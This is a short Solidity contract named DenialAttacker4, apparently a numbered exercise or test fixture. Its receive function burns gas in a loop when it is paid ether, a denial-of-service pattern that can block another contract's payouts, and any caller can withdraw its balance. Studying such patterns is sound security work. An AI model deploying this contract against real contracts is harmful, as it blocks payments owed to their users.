pragma solidity ^0.8.0;

contract DenialAttacker4 {
    receive() external payable {
        uint x = 0;
        while (gasleft() > 2300) {
            x++;
        }
    }

    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}